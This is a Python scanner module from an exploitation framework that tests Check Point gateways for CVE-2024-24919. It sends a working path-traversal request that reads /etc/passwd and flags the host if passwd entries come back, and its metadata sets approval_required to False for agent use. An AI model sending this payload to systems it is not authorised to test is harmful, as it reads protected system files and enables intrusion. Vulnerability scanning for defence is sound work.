#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Potentially allowing an attacker to read certain information on Check Point Security Gateways once connected t."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Check Point Quantum Gateway - Information Disclosure Detection',
        'description': 'Potentially allowing an attacker to read certain information on Check Point Security Gateways once connected to the internet and enabled with remote Access VPN or Mobile Access Software Blades. A Security fix that mitigates this vulnerability is available.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2024', 'checkpoint', 'lfi', 'kev', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://labs.watchtowr.com/check-point-wrong-check-point-cve-2024-24919/',
            'https://support.checkpoint.com/results/sk/sk182337',
            'https://s4e.io/tools/check-point-quantum-gateway-information-disclosure-cve-2024-24919',
            'https://thehackernews.com/2024/05/check-point-warns-of-zero-day-attacks.html',
            'https://censys.com/cve-2024-24919/',
        ],
        'cve': 'CVE-2024-24919',
    }

    def run(self):
        path = '/clients/MyCRL'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Accept-Encoding': 'gzip'}, data='aCSHELL/../../../../../../../etc/passwd\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*', 'nobody:.*',)
        if any(re.search(rx, body) for rx in body_regexes):
            self.set_info(severity='high', reason='Check Point Quantum Gateway - Information Disclosure detected', path=path)
            return True
        return False

